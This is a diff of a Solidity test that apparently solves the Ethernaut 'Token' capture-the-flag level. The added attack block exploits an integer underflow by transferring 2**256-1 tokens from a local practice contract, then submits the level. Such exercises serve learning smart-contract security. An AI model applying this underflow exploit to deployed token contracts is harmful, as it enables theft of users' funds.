@@ -23,10 +23,24 @@ contract TokenHack is DSTest {
     function testTokenHack() public {
         //LEVEL SETUP
         TokenFactory tokenFactory = new TokenFactory();
-        ethernaut.registerLevelInstance(tokenFactory);
+        ethernaut.registerLevel(tokenFactory);
         vm.startPrank(attacker);
 
         address levelAddress = ethernaut.createLevelInstance(tokenFactory);
         Token tokenContract = Token(payable(levelAddress));
-    }
+
+        //LEVEL ATTACK
+        uint MAX_VALUE = 2**256 - 1;
+        tokenContract.transfer(address(this), MAX_VALUE);
+        uint balance = tokenContract.balanceOf(address(this));
+        assert(balance > 20);
+
+        //LEVEL SUBMISSION
+        bool challengeCompleted = ethernaut.submitLevelInstance(
+           payable(levelAddress)
+    );
+       vm.stopPrank();
+      assert(challengeCompleted);
+  }
 }
+    
